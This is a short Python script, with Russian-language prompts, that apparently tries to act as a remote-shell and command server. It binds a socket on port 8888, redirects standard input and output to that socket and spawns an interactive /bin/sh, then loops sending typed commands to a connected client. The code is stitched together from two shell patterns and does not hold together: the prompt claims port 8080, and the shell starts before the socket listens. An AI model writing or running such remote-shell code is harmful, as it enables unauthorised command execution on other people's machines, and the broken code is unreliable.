import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
s.listen(5)
print("Сервер слушает порт 8080...")
conn, addr = s.accept()
print("Подключено:", addr)
while 1:
    command = input("Введите команду для выполнения на клиенте: ")
    conn.send(command.encode())
    if command.lower() == 'exit':
        conn.send(b'exit')
        break
    result_output = conn.recv(4096).decode()
    print(result_output)
conn.close()
s.close()
